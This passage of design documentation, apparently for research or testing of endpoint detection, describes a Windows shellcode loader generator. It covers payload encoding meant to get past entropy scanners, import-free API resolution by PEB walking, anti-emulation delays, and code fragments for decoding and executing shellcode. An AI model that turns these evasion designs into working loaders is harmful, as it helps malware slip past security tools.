│  Input: LLVM IR (.ll), TraceMode, output path                                  │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ BB Coverage (needs_bb = BB | ApiPlusBB | All)                         │    │
│  │                                                                        │    │
│  │   Uses LLVM opt with SanitizerCoverage pass (industry standard):       │    │
│  │                                                                        │    │
│  │   opt -passes=sancov-module                                            │    │
│  │       -sanitizer-coverage-level=3       (BB-level)                     │    │
│  │       -sanitizer-coverage-trace-pc      (simple callback mode)         │    │
│  │       input.ll -S -o output.bb.ll                                      │    │
│  │                                                                        │    │
│  │   Why trace-pc (not trace-pc-guard):                                   │    │
│  │   • More portable, works on Windows COFF                              │    │
│  │   • No section requirements (.sancov_guards)                          │    │
│  │   • Both modes supported by runtime                                   │    │
│  │                                                                        │    │
│  │   Injects: call void @__sanitizer_cov_trace_pc() at every BB entry    │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                           │                                                     │
│                           ▼                                                     │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ API Tracing (needs_api = Api | ApiPlusBB | Lines | LinesAroundBB | All)│   │
│  │                                                                        │    │
│  │   Text-based LLVM IR scanning (not opt pass):                          │    │
│  │                                                                        │    │
│  │   Target APIs:                                                         │    │
│  │     VirtualAlloc, VirtualProtect, WriteProcessMemory,                  │    │
│  │     CreateRemoteThread, LoadLibrary, GetProcAddress,                   │    │
│  │     CreateProcess, OpenProcess                                         │    │
│  │                                                                        │    │
│  │   For each line containing "call" + API name:                          │    │
│  │     Insert: call void @__checkpoint(i8* @.str.checkpoint.N)            │    │
│  │     Add string constant: @.str.checkpoint.N = "api:APIName\00"         │    │
│  │                                                                        │    │
│  │   String constants injected before first `define` in IR                │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                           │                                                     │
│                           ▼                                                     │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ Runtime Declarations                                                  │    │
│  │                                                                        │    │
│  │   If needs_bb:                                                         │    │
│  │     declare void @__coverage_init()                                    │    │
│  │     declare void @__coverage_flush()                                   │    │
│  │                                                                        │    │
│  │   If needs_api:                                                        │    │
│  │     declare void @__checkpoint(i8*)                                    │    │
│  │     declare void @__trace_line(i32, i8*, i32, i8*)                     │    │
│  │     declare void @__trace_init(i8*)                                    │    │
│  │     declare void @__trace_flush()                                      │    │
│  │                                                                        │    │
│  │   Inserted after metadata, before first definition                    │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  Output: Fully instrumented LLVM IR                                            │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 9. Template Assembly Flow

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        Template Assembly (assembler.rs)                         │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  INPUT: ModuleSelection + payload_header (C code from PayloadEncoder)          │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │  loader_template.c (main template file)                               │    │
│  │                                                                        │    │
│  │  #include <windows.h>                                                  │    │
│  │  // @MODULE:definitions  ←── replaced with definitions.h content      │    │
│  │  // @MODULE:payload      ←── replaced with payload.h (XOR/English)    │    │
│  │                                                                        │    │
│  │  // @MODULE:decoder      ←── decoder/{xor,english}.c                  │    │
│  │  // @MODULE:virtualprotect ← virtualprotect/{standard,undersized}.c   │    │
│  │  // @MODULE:antiemulation ← antiemulation/{none,sirallocalot,timeraw} │    │
│  │  // @MODULE:guardrail    ←── guardrails/{none,env}.c                  │    │
│  │  // @MODULE:decoy        ←── decoy/{none,winexec}.c                   │    │
│  │  // @MODULE:carrier      ←── carrier/{alloc_rw_rx,change_rw_rx,...}   │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  Module reading:                                                               │
│    read_module(relative_path) →                                                │
│      1. Check cache (HashMap<String, String>)                                  │
│      2. Read from templates/modules/{path}                                     │
│      3. Strip #include "definitions.h" (already in template)                   │
│      4. Strip #include <stdio.h> (already in template)                         │
│      5. Cache for reuse                                                        │
│                                                                                 │
│  OUTPUT: Single merged .c file (all modules inlined)                           │
│                                                                                 │
│  THEN: @MUTATE markers in modules can be:                                      │
│    • Transformed by Mutator::apply() (if mutations provided)                   │
│    • Stripped by strip_mutation_markers() (for clean compilation)               │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ Available Modules                                                     │    │
│  │                                                                        │    │
│  │ carrier/                                                               │    │
│  │   alloc_rw_rx.c     Allocate RW, VirtualProtect to RX                 │    │
│  │   change_rw_rx.c    Allocate RW, change protection to RX              │    │
│  │   peb_walk.c        PEB walk-based API resolution                     │    │
│  │                                                                        │    │
│  │ decoder/                                                               │    │
│  │   xor.c             Rolling 2-byte XOR decode                         │    │
│  │   english.c         Dictionary word → byte decode                     │    │
│  │                                                                        │    │
│  │ antiemulation/                                                         │    │
│  │   none.c            No anti-emulation                                 │    │
│  │   sirallocalot.c    Memory allocation stress                          │    │
│  │   timeraw.c         Timing-based detection                            │    │
│  │                                                                        │    │
│  │ guardrails/                                                            │    │
│  │   none.c            No guardrails                                     │    │
│  │   env.c             Environment-based checks                          │    │
│  │                                                                        │    │
│  │ virtualprotect/                                                        │    │
│  │   standard.c        Standard VirtualProtect call                      │    │
│  │   undersized.c      Undersized region protection                      │    │
│  │                                                                        │    │
│  │ decoy/                                                                 │    │
│  │   none.c            No decoy activity                                 │    │
│  │   winexec.c         WinExec-based decoy                               │    │
│  │                                                                        │    │
│  │ header/                                                                │    │
│  │   definitions.h     Shared type definitions and constants             │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 10. Payload Encoding

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                      Payload Encoding (payload.rs)                              │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  PayloadEncoder.encode(bytes, type) → EncodedPayload                           │
│  PayloadEncoder.generate_c_header(encoded) → String (C header code)            │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ XOR Encoding                                                          │    │
│  │                                                                        │    │
│  │   Key: [0xAA, 0x55] (2-byte rolling, configurable)                    │    │
│  │   encoded[i] = payload[i] XOR key[i % 2]                              │    │
│  │                                                                        │    │
│  │   Generated header:                                                    │    │
│  │     #define PAYLOAD_LEN <len>                                          │    │
│  │     unsigned char XOR_KEY[2] = { 0xAA, 0x55 };                        │    │
│  │     unsigned char supermega_payload[PAYLOAD_LEN] = { 0xXX, ... };     │    │
│  │                                                                        │    │
│  │   Decoder module (decoder/xor.c) reverses at runtime                  │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ English Encoding                                                      │    │
│  │                                                                        │    │
│  │   Dictionary: 256 words (60 common English + 196 synthetic "wN")      │    │
│  │   encoded = words.join(" ")                                            │    │
│  │   Each byte → dictionary[byte] → word string                          │    │
│  │                                                                        │    │
│  │   Generated header:                                                    │    │
│  │     const char* DICTIONARY[] = { "the", "be", ... "w255" };           │    │
│  │     char supermega_payload_str[] = "the be to ...";                    │    │
│  │     unsigned char supermega_payload[1] = { 0 }; // dummy              │    │
│  │                                                                        │    │
│  │   Decoder module (decoder/english.c) looks up words → bytes           │    │
│  │                                                                        │    │
│  │   Purpose: Low entropy payload (looks like English text to scanners)  │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  generate_test_payload(size) → vec![0x90; size] with INT3 at end              │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 11. Transform Module (Stub Status)

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                       Transform Module Status                                   │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ AstMutator (transform/ast_mutator.rs)                                 │    │
│  │                                                                        │    │
│  │  STATUS: Partially implemented                                        │    │
│  │                                                                        │    │
│  │  ✓ inject_line_tracing() ─── Legacy macro-based tracing               │    │
│  │    • Emits #define __TRACE_LINE() macro with:                          │    │
│  │      - snprintf → Base64 encode → write to \\.\pipe\rededr_trace     │    │
│  │      - Fallback to stderr if pipe unavailable                         │    │
│  │      - Optional delay loop (configurable microseconds)                │    │
│  │    • Injects __TRACE_LINE(); after each statement ending with ';'     │    │
│  │    • Tracks function boundaries ({/} matching)                        │    │
│  │    • Skips preprocessor directives, comments, empty lines             │    │
│  │                                                                        │    │
│  │  ✗ mutate() ─── NOT YET IMPLEMENTED (returns error)                   │    │
│  │    Planned: tree-sitter AST mutations                                 │    │
│  │    • Control-flow jitter                                              │    │
│  │    • Constant encoding (XOR, stack strings)                           │    │
│  │    • Import reshaping (delay-load, hash-based)                        │    │
│  │    • Function inlining/outlining                                      │    │
│  │                                                                        │    │
│  │  NOTE: Used by LowLevelBuilder.apply_ast_mutations()                  │    │
│  │  NOTE: line_tracer.rs (tree-sitter based) supersedes inject_line_tracing()│ │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ IrMutator (transform/ir_mutator.rs)                                   │    │
│  │                                                                        │    │
│  │  STATUS: Stub only                                                    │    │
│  │                                                                        │    │
│  │  ✗ mutate() ─── NOT YET IMPLEMENTED (returns error)                   │    │
│  │    Planned: LLVM IR semantic-preserving transforms                    │    │
│  │    • Opaque predicates (always-true/false branches)                   │    │
│  │    • CFG flattening (dispatcher-based control flow)                   │    │
│  │    • API call indirection (via function pointers)                     │    │
│  │    • Bogus control flow insertion                                     │    │
│  │                                                                        │    │
│  │  NOTE: mutator/mod.rs (Mutator::apply) handles actual LLVM mutations │    │
│  │        via text-based NOP insertion (llvm.nop_insert)                  │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ compiler/mod.rs                                                       │    │
│  │                                                                        │    │
│  │  STATUS: Placeholder only                                             │    │
│  │  "Compiler functionality is currently in builder.rs"                  │    │
│  │  Reserved for future refactoring                                      │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 12. Two Builder APIs

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                       Two Builder APIs Comparison                               │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌──────────────────────────────┬──────────────────────────────────────────┐   │
│  │   LowLevelBuilder (lib.rs)  │   ArtifactBuilder (builder.rs)          │   │
│  ├──────────────────────────────┼──────────────────────────────────────────┤   │
│  │ Config: BuildConfig          │ Config: BuilderConfig                   │   │
│  │ Uses: LLVM IR pipeline       │ Uses: Clang direct compilation          │   │
│  │ Pipeline:                    │ Pipeline:                               │   │
│  │   source → AST mut → IR     │   source → clang → exe                  │   │
│  │   → IR mut → instrument     │   or: source → clang → IR → mut → exe  │   │
│  │   → llc → ld.lld → exe     │   or: assemble → clang → exe            │   │
│  │                              │                                         │   │
│  │ Linker: ld.lld -flavor link │ Linker: clang -fuse-ld=lld             │   │
│  │ Opt: configurable O0-O3     │ Opt: O2 (direct) / O0 (IR path)        │   │
│  │                              │                                         │   │
│  │ Mutation: Mutation struct    │ Mutation: MutationSpec struct           │   │
│  │                              │   (from mutator/mod.rs)                 │   │
│  │ Template: none               │ Template: ModularTemplate support       │   │
│  │ Instrumentation: inline      │ Instrumentation: apply_instrumentation()│   │
│  │                              │                                         │   │
│  │ Use when: Direct LLVM IR     │ Use when: All other cases (PREFERRED)  │   │
│  │   pipeline needed            │   especially ModularTemplate builds     │   │
│  └──────────────────────────────┴──────────────────────────────────────────┘   │
│                                                                                 │
│  Both share:                                                                   │
│  • Same xwin SDK for Windows cross-compilation                                 │
│  • Same runtime libraries (minimal_runtime.o, instrumentation_runtime.o)       │
│  • Same SHA256 artifact naming                                                 │
│  • Target: x86_64-pc-windows-msvc                                              │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 13. Cross-Compilation Toolchain

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                     Cross-Compilation Toolchain (Linux → Windows)               │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ Required Tools (in PATH)                                              │    │
│  │                                                                        │    │
│  │   clang ──── C compiler (Clang 17+)                                   │    │
│  │   llc ────── LLVM static compiler (IR → object)                       │    │
│  │   ld.lld ─── LLVM linker (object → PE)                               │    │
│  │   lld-link ─ MSVC-compatible linker (for instrumented builds)         │    │
│  │   opt ────── LLVM optimizer (SanitizerCoverage pass)                  │    │
│  │   llvm-nm ── Symbol viewer (runtime symbol verification)              │    │
│  │                                                                        │    │
│  │   Linux-specific paths:                                               │    │
│  │     lld-link: /usr/lib/llvm-17/bin/lld-link                           │    │
│  │     llvm-nm:  /usr/lib/llvm-17/bin/llvm-nm                            │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ xwin SDK Layout ({xwin_dir})                                          │    │
│  │                                                                        │    │
│  │   crt/                                                                 │    │
│  │     include/           ← C runtime headers                            │    │
│  │     lib/x86_64/        ← CRT libs (libcmt.lib)                       │    │
│  │                                                                        │    │
│  │   sdk/                                                                 │    │
│  │     include/                                                           │    │
│  │       ucrt/            ← Universal CRT headers                        │    │
│  │       shared/          ← Shared headers                               │    │
│  │       um/              ← User mode headers (windows.h)                │    │
│  │       winrt/           ← WinRT headers                                │    │
│  │     lib/                                                               │    │
│  │       ucrt/x86_64/     ← Universal CRT libs (libucrt.lib)            │    │
│  │       um/x86_64/       ← User mode libs (kernel32.lib, user32.lib)   │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  Common linker flags:                                                          │
│    -Wl,/subsystem:console                                                      │
│    -Wl,/DEBUG:NONE          (no PDB)                                           │
│    -Wl,/Brepro              (reproducible builds)                              │
│    -Wl,/INCREMENTAL:NO                                                         │
│    -Wl,/OPT:REF             (remove unreferenced functions)                    │
│    -Wl,/OPT:ICF             (fold identical COMDATs)                           │
│    -Wl,-defaultlib:libcmt   (static CRT)                                       │
│    -Wl,-defaultlib:kernel32                                                    │
│                                                                                 │
│  Template-specific extra libraries:                                            │
│    rwx_direct: advapi32, wininet                                               │
│    process_injection: user32                                                   │
│    network_beacon: ws2_32                                                       │
│    eicar_test: advapi32                                                         │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 14. File Inventory

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                           File Inventory — Rust Sources & Runtime               │
├──────────────────────────────────────────────┬──────────┬───────────────────────┤
│ File                                          │ Lines    │ Status               │
├──────────────────────────────────────────────┼──────────┼───────────────────────┤
│ Cargo.toml                                    │    37    │ Complete             │
│ src/lib.rs                                    │   437    │ Complete             │
│ src/builder.rs                                │  2005    │ Complete (largest)   │
│ src/mutator/mod.rs                            │   307    │ Complete (2 mutations)│
│ src/template/mod.rs                           │    10    │ Re-export barrel     │
│ src/template/assembler.rs                     │   298    │ Complete             │
│ src/template/payload.rs                       │   305    │ Complete             │
│ src/transform/mod.rs                          │    10    │ Re-export barrel     │
│ src/transform/ast_mutator.rs                  │   165    │ Partial (line trace) │
│ src/transform/ir_mutator.rs                   │    41    │ Stub only            │
│ src/instrument/mod.rs                         │    10    │ Re-export barrel     │
│ src/instrument/instrumenter.rs                │   337    │ Complete (SanCov)    │
│ src/instrument/line_tracer.rs                 │   324    │ Complete (tree-sitter)│
│ src/compiler/mod.rs                           │     7    │ Placeholder          │
│ runtime/minimal_runtime.c                     │   200    │ Complete             │
│ runtime/minimal_runtime.h                     │    47    │ Complete             │
│ runtime/instrumentation_runtime.c             │   889    │ Complete             │
│ runtime/instrumentation.h                     │    84    │ Complete             │
│ test_instrumentation.rs                       │   528    │ Integration test     │
├──────────────────────────────────────────────┼──────────┼───────────────────────┤
│ SUBTOTAL (Rust + Runtime)                    │  ~5045   │                      │
└──────────────────────────────────────────────┴──────────┴───────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│                           File Inventory — Templates                            │
├──────────────────────────────────────────────┬──────────┬───────────────────────┤
│ File                                          │ Lines    │ Role                 │
├──────────────────────────────────────────────┼──────────┼───────────────────────┤
│ templates/loader_template.c                   │    92    │ Master template      │
│ templates/payload.h                           │    19    │ Fallback payload     │
│ templates/modules/header/definitions.h        │    46    │ Interface contract   │
│ templates/modules/carrier/alloc_rw_rx.c       │    39    │ Standard carrier     │
│ templates/modules/carrier/change_rw_rx.c      │    31    │ In-place carrier     │
│ templates/modules/carrier/peb_walk.c          │   186    │ Import-free carrier  │
│ templates/modules/decoder/xor.c               │    21    │ XOR rolling decode   │
│ templates/modules/decoder/english.c           │    36    │ Dictionary decode    │
│ templates/modules/antiemulation/none.c        │    12    │ No-op                │
│ templates/modules/antiemulation/sirallocalot.c│    59    │ Memory stress        │
│ templates/modules/antiemulation/timeraw.c     │    29    │ KUSER_SHARED_DATA    │
│ templates/modules/guardrails/none.c           │    11    │ Always proceed       │
│ templates/modules/guardrails/env.c            │    83    │ Env var check        │
│ templates/modules/virtualprotect/standard.c   │    10    │ Direct VP wrapper    │
│ templates/modules/virtualprotect/undersized.c │    22    │ Chunked VP wrapper   │
│ templates/modules/decoy/none.c                │    10    │ No-op                │
│ templates/modules/decoy/winexec.c             │    12    │ Launch notepad       │
│ templates/encoder.py                          │   127    │ Legacy Python encoder│
│ templates/Makefile                            │    31    │ Legacy build         │
│ templates/build.sh                            │    29    │ Legacy build script  │
├──────────────────────────────────────────────┼──────────┼───────────────────────┤
│ SUBTOTAL (Templates)                         │   ~905   │ 20 files             │
├──────────────────────────────────────────────┼──────────┼───────────────────────┤
│ GRAND TOTAL                                  │  ~5950   │ 39 files             │
└──────────────────────────────────────────────┴──────────┴───────────────────────┘
```

---

## 15. Template Files Deep Dive

### 15.1 loader_template.c — Master Template

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                     loader_template.c (92 lines)                               │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  Structure (top-to-bottom):                                                    │
│                                                                                 │
│    #include <windows.h>                                                        │
│    #include <stdio.h>                                                          │
│    // @MODULE:definitions    ←── definitions.h (types, prototypes)             │
│    // @MODULE:payload        ←── payload.h (encoded shellcode bytes)           │
│    // @MODULE:decoder        ←── decoder module (xor.c or english.c)          │
│    // @MODULE:virtualprotect ←── virtualprotect module                        │
│    // @MODULE:antiemulation  ←── antiemulation module                         │
│    // @MODULE:guardrail      ←── guardrail module                             │
│    // @MODULE:decoy          ←── decoy module                                 │
│    // @MODULE:carrier        ←── carrier module (LAST - calls others)         │
│                                                                                 │
│    int main() {                                                                │
│        // @MUTATE:timing_jitter(none|short|medium|long)                        │
│        // @MUTATE:opaque_predicate(none|simple|nested)                         │
│                                                                                 │
│        int gr = guardrail();                                                   │
│        if (gr != 0) { ExitProcess(gr); }                                      │
│                                                                                 │
│        antiemulation();                                                        │
│        // @MUTATE:benign_api_calls(none|registry|file|network)                 │
│                                                                                 │
│        decoy();                                                                │
│                                                                                 │
│        // @MUTATE:pre_carrier_delay(none|sleep|busy_wait|event)                │
│        carrier();                                                              │
│                                                                                 │
│        return 0;                                                               │
│    }                                                                           │
│                                                                                 │
│  Execution Flow:                                                               │
│    main() → guardrail() → antiemulation() → decoy() → carrier()              │
│                                                                                 │
│  @MODULE Marker Order Matters:                                                 │
│    definitions.h MUST come first (declares all types/prototypes)              │
│    payload MUST come before decoder (decoder references payload data)         │
│    carrier comes LAST (calls decode_payload, MyVirtualProtect, etc.)          │
│                                                                                 │
│  @MUTATE Markers in main():                                                   │
│    timing_jitter ─── Insert timing delays before execution                    │
│    opaque_predicate ─ Guard real code with always-true predicates             │
│    benign_api_calls ─ Noise APIs between real stages                          │
│    pre_carrier_delay ─ Delay before carrier (timing evasion)                  │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 15.2 Module Interface Contract (definitions.h)

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    modules/header/definitions.h (46 lines)                      │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  CONSTANTS:                                                                    │
│    p_RW  = 0x04  (PAGE_READWRITE)                                             │
│    p_RX  = 0x20  (PAGE_EXECUTE_READ)                                          │
│    p_RWX = 0x40  (PAGE_EXECUTE_READWRITE)                                     │
│                                                                                 │
│  TYPE DEFINITIONS:                                                             │
│    VirtualProtect_t = BOOL(*)(LPVOID, SIZE_T, DWORD, PDWORD)                 │
│    VirtualAlloc_t   = LPVOID(*)(LPVOID, SIZE_T, DWORD, DWORD)                │
│                                                                                 │
│  MODULE INTERFACE PROTOTYPES (contract all modules must satisfy):             │
│    ┌──────────────────────────────────────────────────────────────┐           │
│    │  void carrier()          ← Main execution: decode → exec    │           │
│    │  void decode_payload()   ← Decode encrypted payload bytes   │           │
│    │  void antiemulation()    ← Delay/stress before execution    │           │
│    │  void decoy()            ← Benign activity for camouflage   │           │
│    │  int  guardrail()        ← Return 0=proceed, nonzero=abort  │           │
│    │  BOOL MyVirtualProtect(  ← Wrapper around VirtualProtect    │           │
│    │    LPVOID, SIZE_T, DWORD, PDWORD)                           │           │
│    └──────────────────────────────────────────────────────────────┘           │
│                                                                                 │
│  PAYLOAD EXTERN (defined in payload.h, used by carrier/decoder):             │
│    extern unsigned char supermega_payload[];                                   │
│    extern char supermega_payload_str[];  (for English encoding)               │
│                                                                                 │
│  This header establishes the plug-in contract. Any module variant             │
│  must implement its declared prototype with matching signature.               │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 15.3 Carrier Modules

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        CARRIER MODULE VARIANTS                                 │
│  Purpose: Allocate memory, decode payload, change protection, execute         │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ carrier/alloc_rw_rx.c (39 lines)  ─── Standard Carrier               │    │
│  │                                                                        │    │
│  │  Strategy: Allocate new RW region → decode → protect to RX → execute  │    │
│  │                                                                        │    │
│  │  Flow:                                                                 │    │
│  │    1. VirtualAlloc(NULL, PAYLOAD_LEN, MEM_COMMIT|RESERVE, p_RW)       │    │
│  │    2. memcpy(alloc, supermega_payload, PAYLOAD_LEN)                    │    │
│  │    3. decode_payload()   ← @MUTATE:decode_call_method(direct|inline)  │    │
│  │    4. MyVirtualProtect(alloc, PAYLOAD_LEN, p_RX, &old)               │    │
│  │    5. Execute via:                                                     │    │
│  │       @MUTATE:execution_method(direct|callback|fiber|threadpool)       │    │
│  │         direct ─── ((void(*)())alloc)()  (cast + call)                │    │
│  │         callback ─ EnumWindows((WNDENUMPROC)alloc, 0)                 │    │
│  │         fiber ──── ConvertThreadToFiber → CreateFiber → SwitchToFiber │    │
│  │         threadpool ─ CreateThread(alloc) → WaitForSingleObject        │    │
│  │                                                                        │    │
│  │  @MUTATE markers (12 total):                                           │    │
│  │    alloc_flags, copy_method, decode_call_method, api_wrapper,          │    │
│  │    timing_jitter, pre_protect_delay, memory_pad, execution_method,     │    │
│  │    error_handling, cleanup, pre_execute_delay, post_execute_action     │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ carrier/change_rw_rx.c (31 lines)  ─── In-Place Carrier              │    │
│  │                                                                        │    │
│  │  Strategy: Use existing payload memory, change protection in-place    │    │
│  │  Difference: No VirtualAlloc, no memcpy — operates on supermega_payload│   │
│  │                                                                        │    │
│  │  Flow:                                                                 │    │
│  │    1. MyVirtualProtect(supermega_payload, PAYLOAD_LEN, p_RW, &old)    │    │
│  │    2. decode_payload()                                                 │    │
│  │    3. MyVirtualProtect(supermega_payload, PAYLOAD_LEN, p_RX, &old)    │    │
│  │    4. ((void(*)())supermega_payload)()                                 │    │
│  │                                                                        │    │
│  │  Detection profile: No new allocation (avoids VirtualAlloc telemetry) │    │
│  │  @MUTATE markers: 4 (timing_jitter, pre_protect_delay, api_wrapper,   │    │
│  │                       execution_method)                                │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ carrier/peb_walk.c (186 lines)  ─── Import-Free Carrier              │    │
│  │                                                                        │    │
│  │  Strategy: Resolve all APIs via PEB walking — zero IAT entries        │    │
│  │  Purpose: Defeats static import table scanning (no VirtualAlloc in IAT)│   │
│  │                                                                        │    │
│  │  Internal structures (manually defined, avoids winternl.h):           │    │
│  │    PEB_LDR_DATA, LDR_DATA_TABLE_ENTRY, UNICODE_STRING                │    │
│  │                                                                        │    │
│  │  API Resolution:                                                       │    │
│  │    1. get_module_by_name(L"kernel32.dll"):                            │    │
│  │       • Read GS:[0x60] (x64) or FS:[0x30] (x86) → PEB pointer       │    │
│  │       • Walk PEB.Ldr.InMemoryOrderModuleList                          │    │
│  │       • Case-insensitive Unicode name comparison                      │    │
│  │                                                                        │    │
│  │    2. get_func_by_name(module, "VirtualAlloc"):                       │    │
│  │       • Parse PE headers from module base address                     │    │
│  │       • Walk IMAGE_EXPORT_DIRECTORY                                   │    │
│  │       • Match function name, resolve ordinal → address                │    │
│  │                                                                        │    │
│  │  Resolved functions:                                                   │    │
│  │    VirtualAlloc_t pVirtualAlloc                                       │    │
│  │    VirtualProtect_t pVirtualProtect                                   │    │
│  │                                                                        │    │
│  │  Then: Same alloc → decode → protect → execute flow                   │    │
│  │  @MUTATE markers: 5 (api_resolution_order, hash_function,             │    │
│  │                       timing_jitter, execution_method, api_wrapper)    │    │
│  │                                                                        │    │
│  │  Detection profile: No static imports for sensitive APIs              │    │
│  │  Size: Largest carrier (~186 lines vs ~31-39 for others)              │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  Carrier Selection Impact on Detection:                                        │
│  ┌──────────────┬──────────────┬────────────────────────────────────────────┐  │
│  │ Carrier      │ IAT Visible  │ Memory Pattern                            │  │
│  ├──────────────┼──────────────┼────────────────────────────────────────────┤  │
│  │ alloc_rw_rx  │ VirtualAlloc │ New alloc(RW) → VProtect(RX) → exec      │  │
│  │              │ VProtect     │                                            │  │
│  ├──────────────┼──────────────┼────────────────────────────────────────────┤  │
│  │ change_rw_rx │ VProtect     │ Existing section: RW → decode → RX → exec│  │
│  │              │ only         │                                            │  │
│  ├──────────────┼──────────────┼────────────────────────────────────────────┤  │
│  │ peb_walk     │ None         │ PEB read → alloc(RW) → VProtect(RX)      │  │
│  │              │              │ (all APIs resolved at runtime)             │  │
│  └──────────────┴──────────────┴────────────────────────────────────────────┘  │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 15.4 Decoder Modules

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        DECODER MODULE VARIANTS                                 │
│  Purpose: Transform encoded payload bytes back to original shellcode          │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ decoder/xor.c (21 lines)  ─── XOR Rolling Decode                     │    │
│  │                                                                        │    │
│  │  void decode_payload() {                                               │    │
│  │    for (int i = 0; i < PAYLOAD_LEN; i++) {                             │    │
│  │      supermega_payload[i] ^= XOR_KEY[i % sizeof(XOR_KEY)];            │    │
│  │    }                                                                   │    │
│  │  }                                                                     │    │
│  │                                                                        │    │
│  │  @MUTATE markers:                                                      │    │
│  │    key_upgrade(xor|aes|rc4)         ─ Algorithm swap                  │    │
│  │    control_flow_flattening(off|on)  ─ Flatten decode loop CFG         │    │
│  │    loop_restructuring(standard|unrolled|reversed) ─ Loop transform    │    │
│  │                                                                        │    │
│  │  Requires: XOR_KEY[] and supermega_payload[] from payload.h           │    │
│  │  Encoding: PayloadEncoder::Xor (payload.rs) or XorEncoder (encoder.py)│    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ decoder/english.c (36 lines)  ─── Dictionary Decode                   │    │
│  │                                                                        │    │
│  │  void decode_payload() {                                               │    │
│  │    char* token = strtok(supermega_payload_str, " ");                   │    │
│  │    int idx = 0;                                                        │    │
│  │    while (token != NULL) {                                             │    │
│  │      for (int j = 0; j < 256; j++) {                                   │    │
│  │        if (strcmp(token, DICTIONARY[j]) == 0) {                         │    │
│  │          supermega_payload[idx++] = (unsigned char)j;                   │    │
│  │          break;                                                        │    │
│  │        }                                                               │    │
│  │      }                                                                 │    │
│  │      token = strtok(NULL, " ");                                        │    │
│  │    }                                                                   │    │
│  │  }                                                                     │    │
│  │                                                                        │    │
│  │  Requires: DICTIONARY[256] and supermega_payload_str from payload.h   │    │
│  │  Encoding: PayloadEncoder::English (payload.rs) or EnglishEncoder     │    │
│  │  Purpose: Payload looks like English text → low entropy → evades      │    │
│  │           entropy-based scanning heuristics                            │    │
│  │  Trade-off: ~5x payload size increase (each byte → word)             │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  Decoder ↔ Encoding Pairing (MUST match):                                     │
│  ┌──────────────┬──────────────────┬──────────────────────────────────────┐    │
│  │ Decoder      │ Encoding         │ payload.h Provides                   │    │
│  ├──────────────┼──────────────────┼──────────────────────────────────────┤    │
│  │ xor.c        │ EncodingType::Xor│ XOR_KEY[], supermega_payload[]      │    │
│  │ english.c    │ EncodingType::Eng│ DICTIONARY[], supermega_payload_str[]│   │
│  └──────────────┴──────────────────┴──────────────────────────────────────┘    │
│  Enforced by: EncodingType::decoder_module() → returns module name            │
